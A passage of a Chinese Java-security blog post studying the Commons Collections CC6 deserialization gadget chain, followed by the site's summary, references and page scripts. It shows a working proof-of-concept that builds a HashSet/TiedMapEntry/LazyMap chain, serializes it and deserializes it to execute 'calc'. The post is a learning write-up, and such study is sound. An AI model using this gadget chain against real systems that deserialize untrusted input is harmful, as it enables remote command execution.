class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap hsmap=(HashMap) hsset.get(hs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(hsmap);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>本以为cc6跟前面cc4、5一样进行变式就行了理解起来很容易，但实际学习中虽然只改变入口为hashmap和hashset，但为了理解里面的原理踩了好些坑，也更了解了hashmap和hashset序列化的过程（包括通过反射去修改hashmap的key值），如果只是跟着网上的资料学习跟踪链的话，很多细节还是被直接过掉了，还是要尽可能学习逆向思维，找到为什么这段代码能触发，为什么要这么写，写成其他的为啥不行，被绕进去好几次，但最后还是理清楚了很多，学到了很多，但在默认的序列化功能源码上多少还有些不太明白理的清的地方。</p>
+<h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.runoob.com/manual/jdk11api/java.base/java/util/HashSet.html#method.detail">https://www.runoob.com/manual/jdk11api/java.base/java/util/HashSet.html#method.detail</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#commons-collections-6">https://paper.seebug.org/1242/#commons-collections-6</a><br>java漫谈</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/340e4601.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-12-16 18:16:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                        #Java安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/java%E5%88%A9%E7%94%A8%E9%93%BE/" title="java利用链">
+                        #java利用链
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">0x00、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E3%80%81Apache-Commons-Collections%E6%8F%8F%E8%BF%B0"><span class="toc-text">0x01、Apache Commons Collections描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">0x02、环境准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03%E3%80%81%E5%88%86%E6%9E%90"><span class="toc-text">0x03、分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E9%A1%BECC5%E9%93%BE"><span class="toc-text">回顾CC5链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">CC6链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF%E4%B8%80%EF%BC%9AHashMap"><span class="toc-text">实现思路一：HashMap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%8E%92%E6%9F%A5"><span class="toc-text">报错排查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98"><span class="toc-text">解决序列化问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%9C%AC%E5%9C%B0%E8%A7%A6%E5%8F%91%E9%97%AE%E9%A2%98"><span class="toc-text">解决本地触发问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-1"><span class="toc-text">POC-1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%96%91%E6%83%91"><span class="toc-text">疑惑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-2"><span class="toc-text">POC-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-3"><span class="toc-text">POC-3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF%E4%BA%8C%EF%BC%9AHashSet"><span class="toc-text">实现思路二：HashSet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-text">分析过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-1-1"><span class="toc-text">POC-1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-2-1"><span class="toc-text">POC-2</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">0x04、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">0x05、参考链接</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: '5WzQHrZA6gNtoCZa9qWZkFjv-gzGzoHsz',
+        appKey: 'O1mOg3eUPYzPIUYEaX54ip6s',
+        placeholder: 'here',
+        avatar: 'monsterid',
+        lang: 'zh-CN'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Okaytc">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">Copyright © Okaytc 2022</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">一个热爱健身的脚本小子</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + java%E5%AE%89%E5%85%A8-CC6%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fokaytc.github.io%2Fposts%2F9758c0a8.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://okaytc.github.io/posts/9758c0a8.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
